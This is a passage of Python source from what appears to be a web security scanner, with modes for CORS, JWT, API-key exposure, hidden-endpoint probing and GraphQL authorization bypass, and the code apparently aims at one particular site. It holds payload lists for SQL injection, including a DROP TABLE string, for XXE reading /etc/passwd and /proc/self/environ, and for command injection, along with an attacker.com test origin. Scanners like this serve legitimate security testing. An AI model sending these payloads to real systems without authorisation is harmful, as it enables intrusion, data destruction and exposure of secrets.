        CliOutput.warn(f"PoolPlayers GraphQL bypass testing error: {e}", indent=1)
    
    return bypass_results


# ================================================================================
# MODE 16: FORM AUTO-FILL DETECTION
# ================================================================================

async def test_form_autodetection(page, context):
    """
    Detect auto-fillable forms and what data fields they accept.
    Analyzes form structure, autocomplete attributes, and input types.
    """
    form_results = {
        "total_forms": 0,
        "autodetectable_forms": [],
        "form_fields": [],
        "password_manager_compatible": False
    }
    
    try:
        # Find all forms on the page
        forms = await page.query_selector_all("form")
        form_results["total_forms"] = len(forms)
        
        for form_idx, form in enumerate(forms):
            form_info = {
                "form_index": form_idx,
                "form_id": await form.get_attribute("id"),
                "form_name": await form.get_attribute("name"),
                "form_method": await form.get_attribute("method") or "GET",
                "form_action": await form.get_attribute("action"),
                "has_autocomplete": False,
                "fields": []
            }
            
            # Check for autocomplete attribute
            autocomplete = await form.get_attribute("autocomplete")
            form_info["has_autocomplete"] = autocomplete and autocomplete.lower() != "off"
            
            # Analyze all input fields in the form
            inputs = await form.query_selector_all("input")
            for input_field in inputs:
                field_info = {
                    "type": await input_field.get_attribute("type") or "text",
                    "name": await input_field.get_attribute("name"),
                    "id": await input_field.get_attribute("id"),
                    "autocomplete": await input_field.get_attribute("autocomplete"),
                    "placeholder": await input_field.get_attribute("placeholder"),
                    "required": await input_field.get_attribute("required") is not None
                }
                form_info["fields"].append(field_info)
                form_results["form_fields"].append(field_info)
                
                # Check for password manager compatibility
                if field_info["type"] == "password":
                    form_results["password_manager_compatible"] = True
            
            # Analyze textareas
            textareas = await form.query_selector_all("textarea")
            for textarea in textareas:
                field_info = {
                    "type": "textarea",
                    "name": await textarea.get_attribute("name"),
                    "id": await textarea.get_attribute("id"),
                    "autocomplete": await textarea.get_attribute("autocomplete"),
                    "placeholder": await textarea.get_attribute("placeholder"),
                    "required": await textarea.get_attribute("required") is not None
                }
                form_info["fields"].append(field_info)
                form_results["form_fields"].append(field_info)
            
            # Analyze select fields
            selects = await form.query_selector_all("select")
            for select in selects:
                field_info = {
                    "type": "select",
                    "name": await select.get_attribute("name"),
                    "id": await select.get_attribute("id"),
                    "autocomplete": await select.get_attribute("autocomplete"),
                    "options": len(await select.query_selector_all("option")),
                    "required": await select.get_attribute("required") is not None
                }
                form_info["fields"].append(field_info)
                form_results["form_fields"].append(field_info)
            
            if form_info["fields"]:
                form_results["autodetectable_forms"].append(form_info)
    
    except Exception as e:
        CliOutput.warn(f"Form auto-detection error: {e}", indent=1)
    
    return form_results


# ================================================================================
# MODE 17: API RESPONSE CACHING ANALYSIS
# ================================================================================

async def test_response_caching_analysis(page, context):
    """
    Detect cached responses and analyze cache headers and directives.
    Identifies caching vulnerabilities and sensitive data caching issues.
    """
    caching_results = {
        "total_requests": 0,
        "cached_responses": [],
        "vulnerable_caching": [],
        "etag_analysis": [],
        "cache_control_analysis": []
    }
    
    try:
        # Capture network activity to analyze caching
        network_requests = []
        
        async def handle_response(response):
            try:
                headers = response.headers
                request = response.request
                
                response_info = {
                    "url": request.url,
                    "method": request.method,
                    "status_code": response.status_code,
                    "cache_control": headers.get("cache-control", "").lower(),
                    "expires": headers.get("expires", ""),
                    "etag": headers.get("etag", ""),
                    "last_modified": headers.get("last-modified", ""),
                    "age": headers.get("age", ""),
                    "pragma": headers.get("pragma", "").lower(),
                }
                
                # Analyze caching strategy
                is_cached = False
                cache_type = "no-cache"
                
                if "public" in response_info["cache_control"]:
                    cache_type = "public"
                    is_cached = True
                elif "private" in response_info["cache_control"]:
                    cache_type = "private"
                    is_cached = True
                elif response_info["expires"]:
                    cache_type = "expires-based"
                    is_cached = True
                elif response_info["etag"]:
                    cache_type = "conditional"
                elif "no-cache" not in response_info["cache_control"] and "no-store" not in response_info["cache_control"]:
                    cache_type = "implicit"
                    is_cached = True
                
                response_info["is_cached"] = is_cached
                response_info["cache_type"] = cache_type
                
                # Check for vulnerable caching (sensitive data)
                if is_cached and any(sensitive in request.url.lower() for sensitive in ["/api/", "/user", "/account", "/profile", "/auth", "/token"]):
                    caching_results["vulnerable_caching"].append({
                        "url": request.url,
                        "cache_control": response_info["cache_control"],
                        "risk": "Sensitive endpoint may be cached"
                    })
                
                if response_info["etag"]:
                    caching_results["etag_analysis"].append({
                        "url": request.url,
                        "etag": response_info["etag"],
                        "validation_possible": True
                    })
                
                caching_results["cache_control_analysis"].append(response_info)
                network_requests.append(response_info)
                
            except Exception as e:
                pass
        
        page.on("response", handle_response)
        
        # Trigger page activity to capture requests
        await page.evaluate("() => { }")
        await page.wait_for_load_state("networkidle", timeout=5000)
        
        caching_results["total_requests"] = len(network_requests)
        caching_results["cached_responses"] = [r for r in network_requests if r.get("is_cached")]
        
    except Exception as e:
        CliOutput.warn(f"Response caching analysis error: {e}", indent=1)
    
    return caching_results


# ================================================================================
# MODE 18: DATA LEAKAGE DETECTION
# ================================================================================

import re

async def detect_data_leakage(page_data, api_responses):
    """
    Detect PII and sensitive data in page responses.
    Scans for emails, SSNs, credit cards, API keys, phone numbers, and database connection strings.
    """
    leakage_results = {
        "found_pii": [],
        "pii_summary": {},
        "risk_level": "LOW"
    }
    
    try:
        # Regex patterns for various PII
        patterns = {
            "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
            "credit_card": r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b',
            "phone": r'\b(\d{3}[-.]?\d{3}[-.]?\d{4})\b',
            "api_key": r'(api[_-]?key|apikey|access[_-]?key|secret[_-]?key)["\s:=]+([a-zA-Z0-9_\-]{32,})',
            "db_string": r'(postgres|mysql|mongodb|redis)://[^\s]+',
            "ipv4_private": r'\b(192\.168\.|10\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[01]\.)\d{1,3}\.\d{1,3}\b',
        }
        
        # Scan page HTML
        page_html = await page_data if isinstance(page_data, str) else str(page_data)
        
        for pii_type, pattern in patterns.items():
            matches = re.finditer(pattern, page_html, re.IGNORECASE)
            for match in matches:
                leakage_results["found_pii"].append({
                    "type": pii_type,
                    "value": match.group(0)[:50] + ("..." if len(match.group(0)) > 50 else ""),
                    "location": "page_html"
                })
        
        # Scan API responses
        if isinstance(api_responses, dict):
            response_text = json.dumps(api_responses)
            for pii_type, pattern in patterns.items():
                matches = re.finditer(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    leakage_results["found_pii"].append({
                        "type": pii_type,
                        "value": match.group(0)[:50] + ("..." if len(match.group(0)) > 50 else ""),
                        "location": "api_response"
                    })
        
        # Calculate summary
        for pii_type in patterns.keys():
            count = sum(1 for item in leakage_results["found_pii"] if item["type"] == pii_type)
            if count > 0:
                leakage_results["pii_summary"][pii_type] = count
        
        # Determine risk level
        total_pii = len(leakage_results["found_pii"])
        if total_pii >= 10:
            leakage_results["risk_level"] = "CRITICAL"
        elif total_pii >= 5:
            leakage_results["risk_level"] = "HIGH"
        elif total_pii >= 1:
            leakage_results["risk_level"] = "MEDIUM"
        
    except Exception as e:
        CliOutput.warn(f"Data leakage detection error: {e}", indent=1)
    
    return leakage_results


# ================================================================================
# MODE 19: HIDDEN/DEBUG ENDPOINTS DISCOVERY
# ================================================================================

async def discover_hidden_endpoints(page, base_url):
    """
    Discover hidden, debug, and internal endpoints by probing common paths.
    Tests for debug endpoints, admin panels, API versions, status pages, and backups.
    """
    discovered_endpoints = {
        "accessible": [],
        "redirects": [],
        "errors": [],
        "total_probed": 0
    }
    
    try:
        # Parse base URL
        from urllib.parse import urlparse, urljoin
        parsed = urlparse(base_url)
        base_domain = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common hidden endpoints to probe
        endpoint_paths = [
            # Debug endpoints
            "/__debug__", "/debug", "/api/debug", "/dev-tools", "/_debug",
            # Internal endpoints
            "/__internal__", "/internal", "/private", "/service", "/intranet",
            # API versions
            "/api/v2", "/api/v3", "/api/beta", "/api/alpha", "/api/dev",
            # Admin panels
            "/admin", "/administrator", "/admin-panel", "/staff", "/superuser",
            # Development
            "/dev", "/development", "/test", "/testing", "/sandbox",
            # Configuration
            "/config", "/settings", "/.env", "/env.json", "/config.php", "/config.js",
            # Status pages
            "/health", "/status", "/ping", "/info", "/version", "/api/status",
            # Backups
            "/backup", "/archive", "/download", "/export", "/dump", "/backup.sql",
        ]
        
        for path in endpoint_paths:
            discovered_endpoints["total_probed"] += 1
            endpoint_url = urljoin(base_domain, path)
            
            try:
                response = requests.head(endpoint_url, timeout=5, allow_redirects=False)
                
                endpoint_info = {
                    "path": path,
                    "url": endpoint_url,
                    "status_code": response.status_code,
                    "method": "HEAD"
                }
                
                if response.status_code < 400:
                    discovered_endpoints["accessible"].append(endpoint_info)
                elif 300 <= response.status_code < 400:
                    endpoint_info["redirect_to"] = response.headers.get("Location")
                    discovered_endpoints["redirects"].append(endpoint_info)
                else:
                    endpoint_info["error"] = f"HTTP {response.status_code}"
                    discovered_endpoints["errors"].append(endpoint_info)
            
            except requests.exceptions.Timeout:
                discovered_endpoints["errors"].append({
                    "path": path,
                    "url": endpoint_url,
                    "error": "Timeout",
                    "method": "HEAD"
                })
            
            except Exception as e:
                discovered_endpoints["errors"].append({
                    "path": path,
                    "url": endpoint_url,
                    "error": str(e)[:100],
                    "method": "HEAD"
                })
    
    except Exception as e:
        CliOutput.warn(f"Hidden endpoints discovery error: {e}", indent=1)
    
    return discovered_endpoints


# ================================================================================
# MODE 20: CORS POLICY ANALYSIS
# ================================================================================

async def test_cors_analysis(page, context, captured_apis):
    """
    Deep dive into CORS misconfigurations and cross-origin bypass opportunities.
    Analyzes CORS headers and tests for common misconfigurations.
    """
    cors_results = {
        "endpoints_analyzed": 0,
        "cors_enabled": [],
        "cors_misconfigured": [],
        "vulnerable_patterns": [],
        "cors_summary": {}
    }
    
    try:
        # Analyze captured network responses for CORS headers
        # Handle both dict and list formats of captured_apis
        if isinstance(captured_apis, dict):
            items_to_iterate = captured_apis.items()
        else:
            # If it's a list, convert to (index, item) tuples
            items_to_iterate = [(str(i), api) for i, api in enumerate(captured_apis)]
        
        for url, data in items_to_iterate:
            cors_results["endpoints_analyzed"] += 1
            
            endpoint_info = {
                "url": url,
                "cors_headers": {},
                "vulnerable": False,
                "issues": []
            }
            
            # Common CORS headers to check
            cors_headers = [
                "Access-Control-Allow-Origin",
                "Access-Control-Allow-Methods",
                "Access-Control-Allow-Headers",
                "Access-Control-Allow-Credentials",
                "Access-Control-Max-Age",
                "Access-Control-Expose-Headers"
            ]
            
            # Check if CORS headers are present in responses
            # This would come from network analysis
            if isinstance(data, dict) and "network_summary" in data:
                # CORS vulnerability patterns to check for
                patterns = [
                    {"name": "Wildcard Origin", "pattern": "*", "risk": "CRITICAL"},
                    {"name": "Null Origin Accepted", "pattern": "null", "risk": "HIGH"},
                    {"name": "Dynamic Origin (HTTP)", "pattern": "http://", "risk": "HIGH"},
                    {"name": "Subdomain Wildcard", "pattern": "*.example.com", "risk": "MEDIUM"},
                    {"name": "Overly Permissive Methods", "pattern": "*", "risk": "MEDIUM"},
                ]
                
                endpoint_info["cors_patterns_checked"] = len(patterns)
            
            # Test CORS preflight requests
            cors_test_headers = {
                "Origin": "https://attacker.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
            
            try:
                # Attempt OPTIONS request for CORS preflight
                response = requests.options(url, headers=cors_test_headers, timeout=5)
                
                allowed_origin = response.headers.get("Access-Control-Allow-Origin", "")
                allowed_methods = response.headers.get("Access-Control-Allow-Methods", "")
                allow_credentials = response.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
                
                endpoint_info["cors_headers"] = {
                    "Access-Control-Allow-Origin": allowed_origin,
                    "Access-Control-Allow-Methods": allowed_methods,
                    "Access-Control-Allow-Credentials": allow_credentials,
                    "Status-Code": response.status_code
                }
                
                # Check for CORS vulnerabilities
                if allowed_origin == "*":
                    endpoint_info["vulnerable"] = True
                    endpoint_info["issues"].append({
                        "type": "Wildcard Origin",
                        "description": "CORS allows requests from any origin",
                        "risk": "CRITICAL"
                    })
                    cors_results["vulnerable_patterns"].append(endpoint_info["url"])
                
                if allowed_origin == "null" and allow_credentials:
                    endpoint_info["vulnerable"] = True
                    endpoint_info["issues"].append({
                        "type": "Null Origin with Credentials",
                        "description": "CORS accepts null origin with credential sharing",
                        "risk": "HIGH"
                    })
                    cors_results["vulnerable_patterns"].append(endpoint_info["url"])
                
                if "attacker.com" in allowed_origin or allowed_origin == "*":
                    endpoint_info["vulnerable"] = True
                    endpoint_info["issues"].append({
                        "type": "Attacker Origin Accepted",
                        "description": "CORS configuration allows external attacker origins",
                        "risk": "CRITICAL"
                    })
                
                if allowed_origin:
                    cors_results["cors_enabled"].append(endpoint_info)
            
            except Exception:
                pass
        
        # Summary
        cors_results["cors_summary"] = {
            "endpoints_with_cors": len(cors_results["cors_enabled"]),
            "vulnerable_endpoints": len(cors_results["vulnerable_patterns"]),
            "total_analyzed": cors_results["endpoints_analyzed"]
        }
    
    except Exception as e:
        CliOutput.warn(f"CORS analysis error: {e}", indent=1)
    
    return cors_results


# ================================================================================
# MODE 21: JWT TOKEN ANALYSIS
# ================================================================================

async def test_jwt_analysis(page, context):
    """
    Decode and analyze JWT tokens for weak signatures, exp claims, kid manipulation.
    Extracts JWTs from session and analyzes their structure and claims.
    """
    jwt_results = {
        "tokens_found": [],
        "vulnerable_tokens": [],
        "analysis_summary": {}
    }
    
    try:
        import base64
        
        cookies = await context.cookies()
        cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
        
        # Extract JWT patterns from cookies and storage
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.?[A-Za-z0-9_.,-]*'
        
        # Check cookies for JWTs
        for cookie_name, cookie_value in cookie_dict.items():
            import re
            matches = re.findall(jwt_pattern, str(cookie_value))
            for match in matches:
                jwt_results["tokens_found"].append({
                    "source": f"cookie:{cookie_name}",
                    "token": match[:50] + "...",
                    "full_token": match
                })
        
        # Check localStorage
        try:
            storage_data = await page.evaluate("""() => {
                const data = [];
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    if (value && value.includes('eyJ')) {
                        data.push({key: key, value: value});
                    }
                }
                return data;
            }""")
            
            for item in storage_data:
                import re
                matches = re.findall(jwt_pattern, str(item["value"]))
                for match in matches:
                    jwt_results["tokens_found"].append({
                        "source": f"localStorage:{item['key']}",
                        "token": match[:50] + "...",
                        "full_token": match
                    })
        except Exception:
            pass
        
        # Analyze each JWT found
        for token_info in jwt_results["tokens_found"]:
            token = token_info["full_token"]
            analysis = {
                "source": token_info["source"],
                "token_preview": token[:50] + "...",
                "issues": [],
                "claims": {}
            }
            
            try:
                parts = token.split('.')
                if len(parts) >= 2:
                    # Decode header
                    header_padding = parts[0] + '=' * (4 - len(parts[0]) % 4)
                    header = base64.urlsafe_b64decode(header_padding).decode()
                    analysis["header"] = header
                    
                    # Check for algorithm weaknesses
                    if "none" in header.lower():
                        analysis["issues"].append({"type": "None Algorithm", "risk": "CRITICAL", "description": "JWT uses 'none' algorithm"})
                    if "HS256" in header and "secret" not in header.lower():
                        analysis["issues"].append({"type": "Weak Signature Algorithm", "risk": "MEDIUM", "description": "HS256 may use weak secrets"})
                    
                    # Decode payload
                    payload_padding = parts[1] + '=' * (4 - len(parts[1]) % 4)
                    payload = base64.urlsafe_b64decode(payload_padding).decode()
                    import json as _json
                    try:
                        claims = _json.loads(payload)
                        analysis["claims"] = claims
                        
                        # Check for weak claims
                        if "exp" not in claims:
                            analysis["issues"].append({"type": "No Expiration", "risk": "HIGH", "description": "JWT has no expiration claim"})
                        
                        if "kid" in claims:
                            analysis["issues"].append({"type": "KID Claim Present", "risk": "MEDIUM", "description": "JWT contains key ID - may be vulnerable to KID manipulation"})
                        
                        if "sub" in claims and not claims["sub"]:
                            analysis["issues"].append({"type": "Empty Subject", "risk": "MEDIUM", "description": "JWT subject claim is empty"})
                    except Exception:
                        pass
            except Exception as e:
                analysis["decode_error"] = str(e)[:100]
            
            if analysis["issues"]:
                jwt_results["vulnerable_tokens"].append(analysis)
        
        jwt_results["analysis_summary"] = {
            "total_tokens": len(jwt_results["tokens_found"]),
            "vulnerable_tokens": len(jwt_results["vulnerable_tokens"]),
            "issues_found": sum(len(t.get("issues", [])) for t in jwt_results["vulnerable_tokens"])
        }
    
    except Exception as e:
        CliOutput.warn(f"JWT analysis error: {e}", indent=1)
    
    return jwt_results


# ================================================================================
# MODE 22: API KEY EXPOSURE DETECTION
# ================================================================================

async def test_api_key_exposure(page, context):
    """
    Detect hardcoded API keys, tokens in responses, localStorage, or URLs.
    Scans for exposed credentials and API keys.
    """
    exposure_results = {
        "exposed_keys": [],
        "exposure_summary": {},
        "locations": []
    }
    
    try:
        # API key patterns
        key_patterns = {
            "AWS_KEY": r"AKIA[0-9A-Z]{16}",
            "GitHub_Token": r"ghp_[A-Za-z0-9_]{36}",
            "Stripe_Key": r"sk_live_[A-Za-z0-9]{24}",
            "Google_API": r"AIza[0-9A-Za-z\-_]{35}",
            "Generic_API_Key": r"['\"]api[_-]?key['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{32,})['\"]",
            "Bearer_Token": r"Bearer\s+[A-Za-z0-9_\-\.]+",
            "Private_Key": r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----",
            "Firebase_Config": r"apiKey.*firebase",
        }
        
        # Check cookies
        cookies = await context.cookies()
        for cookie in cookies:
            for key_type, pattern in key_patterns.items():
                import re
                if re.search(pattern, str(cookie['value']), re.IGNORECASE):
                    exposure_results["exposed_keys"].append({
                        "type": key_type,
                        "location": f"cookie:{cookie['name']}",
                        "preview": str(cookie['value'])[:50] + "..."
                    })
                    exposure_results["locations"].append(f"cookie:{cookie['name']}")
        
        # Check page content
        page_content = await page.content()
        for key_type, pattern in key_patterns.items():
            import re
            matches = re.finditer(pattern, page_content, re.IGNORECASE)
            for match in matches:
                exposure_results["exposed_keys"].append({
                    "type": key_type,
                    "location": "page_content",
                    "preview": match.group(0)[:50] + "..."
                })
        
        # Check localStorage
        try:
            storage = await page.evaluate("""() => {
                const data = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data[key] = localStorage.getItem(key);
                }
                return data;
            }""")
            
            for key, value in storage.items():
                for key_type, pattern in key_patterns.items():
                    import re
                    if re.search(pattern, str(value), re.IGNORECASE):
                        exposure_results["exposed_keys"].append({
                            "type": key_type,
                            "location": f"localStorage:{key}",
                            "preview": str(value)[:50] + "..."
                        })
                        exposure_results["locations"].append(f"localStorage:{key}")
        except Exception:
            pass
        
        # Check URLs
        current_url = page.url
        for key_type, pattern in key_patterns.items():
            import re
            if re.search(pattern, current_url, re.IGNORECASE):
                exposure_results["exposed_keys"].append({
                    "type": key_type,
                    "location": "url_parameter",
                    "preview": current_url
                })
        
        # Summary
        unique_locations = set(exposure_results["locations"])
        exposure_results["exposure_summary"] = {
            "total_exposed_keys": len(exposure_results["exposed_keys"]),
            "unique_locations": len(unique_locations),
            "key_types_exposed": list(set(k["type"] for k in exposure_results["exposed_keys"]))
        }
    
    except Exception as e:
        CliOutput.warn(f"API key exposure detection error: {e}", indent=1)
    
    return exposure_results


# ================================================================================
# MODE 23: SQL INJECTION TESTING
# ================================================================================

async def test_sqli_testing(page, context):
    """
    Test query parameters for SQLi vulnerabilities.
    Attempts common SQL injection payloads on discovered endpoints.
    """
    sqli_results = {
        "parameters_tested": 0,
        "potential_vulnerabilities": [],
        "test_payloads": [],
        "summary": {}
    }
    
    try:
        # Common SQLi test payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL --",
            "' AND 1=2 UNION SELECT NULL,NULL --",
            "admin' --",
            "' OR 'a'='a",
            "1' ORDER BY 1 --",
            "' OR 1=1 /*",
            "') OR '1'=('1",
        ]
        
        sqli_results["test_payloads"] = sqli_payloads
        
        # Analyze page for injectable parameters
        try:
            form_data = await page.evaluate("""() => {
                const forms = [];
                document.querySelectorAll('form').forEach((form, idx) => {
                    const inputs = [];
                    form.querySelectorAll('input, textarea, select').forEach(input => {
                        inputs.push({
                            name: input.name,
                            type: input.type,
                            value: input.value
                        });
                    });
                    forms.push({
                        index: idx,
                        method: form.method || 'GET',
                        action: form.action,
                        inputs: inputs
                    });
                });
                return forms;
            }""")
            
            sqli_results["parameters_tested"] = sum(len(f["inputs"]) for f in form_data)
            
            # Check for suspicious parameters (commonly injectable)
            suspicious_params = ["id", "name", "search", "query", "filter", "sort", "order", "username", "email"]
            
            for form in form_data:
                for input_field in form["inputs"]:
                    if any(param in input_field["name"].lower() for param in suspicious_params):
                        sqli_results["potential_vulnerabilities"].append({
                            "parameter": input_field["name"],
                            "form_method": form["method"],
                            "form_action": form["action"],
                            "input_type": input_field["type"],
                            "risk": "POTENTIAL",
                            "reason": "Common injectable parameter name"
                        })
        except Exception:
            pass
        
        sqli_results["summary"] = {
            "parameters_analyzed": sqli_results["parameters_tested"],
            "potentially_vulnerable": len(sqli_results["potential_vulnerabilities"]),
            "test_methods": len(sqli_payloads)
        }
    
    except Exception as e:
        CliOutput.warn(f"SQL injection testing error: {e}", indent=1)
    
    return sqli_results


# ================================================================================
# MODE 24: XML/XXE INJECTION TESTING
# ================================================================================

async def test_xxe_injection(page, context):
    """
    If API accepts XML, test for XXE attacks.
    Identifies XML endpoints and tests for XXE vulnerabilities.
    """
    xxe_results = {
        "xml_endpoints": [],
        "xxe_test_payloads": [],
        "vulnerable_endpoints": [],
        "summary": {}
    }
    
    try:
        # XXE test payloads
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        ]
        
        xxe_results["xxe_test_payloads"] = [p[:60] + "..." for p in xxe_payloads]
        
        # Check network requests for XML content-type
        # This would typically come from network analysis
        
        # Check for XML-accepting endpoints
        current_url = page.url
        xml_endpoint_patterns = [
            "/api/xml",
            "/api/soap",
            "/services/soap",
            "/webservice",
            "/upload",
            "/import",
            "/parse"
        ]
        
        for pattern in xml_endpoint_patterns:
            if pattern.lower() in current_url.lower():
                xxe_results["xml_endpoints"].append({
                    "url": current_url,
                    "pattern": pattern,
                    "risk": "POTENTIAL"
                })
        
        # Check for file upload forms that might accept XML
        try:
            forms = await page.query_selector_all("form")
            for form_idx, form in enumerate(forms):
                enctype = await form.get_attribute("enctype") or ""
                if "xml" in enctype.lower() or "multipart" in enctype.lower():
                    action = await form.get_attribute("action") or ""
                    xxe_results["xml_endpoints"].append({
                        "url": action,
                        "form_index": form_idx,
                        "encoding": enctype,
                        "risk": "POTENTIAL"
                    })
        except Exception:
            pass
        
        xxe_results["summary"] = {
            "xml_endpoints_found": len(xxe_results["xml_endpoints"]),
            "test_payloads_available": len(xxe_payloads),
            "manual_testing_required": True
        }
    
    except Exception as e:
        CliOutput.warn(f"XXE injection testing error: {e}", indent=1)
    
    return xxe_results


# ================================================================================
# MODE 25: COMMAND INJECTION TESTING
# ================================================================================

async def test_command_injection(page, context):
    """
    Test parameters for RCE/command execution vulnerabilities.
    Analyzes forms and parameters for potential command injection points.
    """
    command_injection_results = {
        "parameters_analyzed": 0,
        "injectable_parameters": [],
        "test_payloads": [],
        "summary": {}
    }
    
    try:
        # Common command injection test payloads
        command_payloads = [
            "; ls",
            "| whoami",
            "` id `",
            "$(whoami)",
            "&& cat /etc/passwd",
            "\n whoami",
            "; ping -c 1 127.0.0.1",
        ]
        
        command_injection_results["test_payloads"] = command_payloads
        
        # Analyze parameters
        try:
            form_data = await page.evaluate("""() => {
                const params = [];
                document.querySelectorAll('form').forEach((form, fidx) => {
                    form.querySelectorAll('input[type="text"], input[type="search"], textarea').forEach(input => {
                        params.push({
                            name: input.name || input.id,
                            form_index: fidx,
                            placeholder: input.placeholder,
                            value: input.value
                        });
                    });
                });
                return params;
            }""")
            
            command_injection_results["parameters_analyzed"] = len(form_data)
            
            # Identify potentially injectable parameters
            injectable_keywords = ["cmd", "command", "exec", "run", "shell", "process", "system", "query", "filter", "search"]
            
            for param in form_data:
                param_name = (param.get("name") or "").lower()
                if any(keyword in param_name for keyword in injectable_keywords):
                    command_injection_results["injectable_parameters"].append({
                        "parameter_name": param["name"],
                        "form_index": param["form_index"],
                        "risk": "POTENTIAL",
                        "reason": "Parameter name suggests command/process handling"
                    })
        except Exception:
            pass
        
        command_injection_results["summary"] = {
            "parameters_tested": command_injection_results["parameters_analyzed"],
            "potentially_injectable": len(command_injection_results["injectable_parameters"]),
            "test_payload_count": len(command_payloads)
        }
    
    except Exception as e:
        CliOutput.warn(f"Command injection testing error: {e}", indent=1)
    
    return command_injection_results


async def test_graphql_authz_bypass(page, context, captured_apis):
    """
    Test GraphQL endpoints for authorization/permission bypass vulnerabilities.
    Tests: type union probing, cross-user access, schema introspection, mutations.
    """
    authz_bypass_results = {
        "graphql_endpoint": None,
        "type_union_probing": {"attempted": False, "accessible_types": []},
        "cross_user_access": {"attempted": False, "vulnerabilities": []},
        "schema_introspection": {"enabled": False, "types_discovered": 0, "mutations_discovered": 0},
        "batch_query_testing": {"attempted": False, "results": []},
        "nested_query_testing": {"attempted": False, "results": []},
        "mutation_discovery": {"mutations_found": []},
        "security_findings": []
    }
    
    try:
        # Find GraphQL endpoint from captured APIs
        graphql_endpoint = None
        try:
            for api in captured_apis:
                if isinstance(api, dict) and "graphql" in str(api.get("url", "")).lower():
                    graphql_endpoint = api.get("url")
                    break
        except (TypeError, AttributeError):
            # If captured_apis is not iterable or items don't have .get()
            pass
        
        if not graphql_endpoint:
            CliOutput.warn("No GraphQL endpoint found in captured APIs", indent=2)
            return authz_bypass_results
        
        authz_bypass_results["graphql_endpoint"] = graphql_endpoint
        
        # Get access token from localStorage
        access_token = await page.evaluate("() => localStorage.getItem('accessToken')")
        if not access_token:
            CliOutput.warn("No access token found - skipping authorization tests", indent=2)
            return authz_bypass_results
        
        # Test 1: Schema Introspection
        try:
            CliOutput.info("Testing schema introspection capabilities...", indent=2)
            introspection_query = """
            {
              __schema {
                types {
                  name
                  kind
                  description
                }
                mutationType {
                  fields {
                    name
                    description
                  }
                }
              }
            }
            """
            
            response = await page.evaluate(f"""
            async () => {{
                const response = await fetch('{graphql_endpoint}', {{
                    method: 'POST',
                    headers: {{
                        'Authorization': 'Bearer {access_token}',
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        query: `{introspection_query}`
                    }})
                }});
                return await response.json();
            }}
            """)
            
            if isinstance(response, dict) and "data" in response:
                schema_data = response.get("data", {}) if isinstance(response.get("data"), dict) else {}
                schema_data = schema_data.get("__schema", {}) if isinstance(schema_data, dict) else {}
                types = schema_data.get("types", []) if isinstance(schema_data, dict) else []
                mutations_type = schema_data.get("mutationType", {}) if isinstance(schema_data, dict) else {}
                mutations = mutations_type.get("fields", []) if isinstance(mutations_type, dict) else []
                
                authz_bypass_results["schema_introspection"]["enabled"] = True
                authz_bypass_results["schema_introspection"]["types_discovered"] = len(types)
                authz_bypass_results["schema_introspection"]["mutations_discovered"] = len(mutations)
                
                CliOutput.warn(f"⚠️  Schema Introspection ENABLED - {len(types)} types, {len(mutations)} mutations discovered", indent=2)
                
                if len(mutations) > 0:
                    authz_bypass_results["security_findings"].append({
                        "severity": "HIGH",
                        "finding": "Schema Introspection Enabled",
                        "description": f"GraphQL introspection is enabled - {len(mutations)} mutations discovered",
                        "impact": "Attacker can enumerate all API types, fields, and mutations"
                    })
                    authz_bypass_results["mutation_discovery"]["mutations_found"] = [
                        m.get("name") for m in mutations[:10]
                    ]
            else:
                CliOutput.success("✅ Schema introspection DISABLED (no __schema access)", indent=2)
        except Exception as e:
            CliOutput.warn(f"Schema introspection test failed: {e}", indent=2)
        
        # Test 2: Type Union Probing (ExternalStaff, NationalOfficeStaff)
        try:
            CliOutput.info("Probing user type unions (Member/ExternalStaff/NationalOfficeStaff)...", indent=2)
            authz_bypass_results["type_union_probing"]["attempted"] = True
            
            union_test_query = """
            {
              viewer {
                id
                __typename
                ... on Member {
                  firstName
                  lastName
                }
                ... on ExternalStaff {
                  firstName
                  lastName
                }
                ... on NationalOfficeStaff {
                  firstName
                  lastName
                }
              }
            }
            """
            
            response = await page.evaluate(f"""
            async () => {{
                const response = await fetch('{graphql_endpoint}', {{
                    method: 'POST',
                    headers: {{
                        'Authorization': 'Bearer {access_token}',
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        query: `{union_test_query}`
                    }})
                }});
                return await response.json();
            }}
            """)
            
            if isinstance(response, dict) and "data" in response:
                data_obj = response.get("data", {})
                viewer = data_obj.get("viewer", {}) if isinstance(data_obj, dict) else {}
                typename = viewer.get("__typename") if isinstance(viewer, dict) else None
                user_id = viewer.get("id") if isinstance(viewer, dict) else None
                first_name = viewer.get("firstName") if isinstance(viewer, dict) else None
                last_name = viewer.get("lastName") if isinstance(viewer, dict) else None
                
                authz_bypass_results["type_union_probing"]["accessible_types"].append(typename)
                
                # Report results based on type
                if typename == "Member":
                    CliOutput.success(f"✅ Member type: Returned (ID: {user_id}, Name: {first_name} {last_name})", indent=2)
                elif typename == "ExternalStaff":
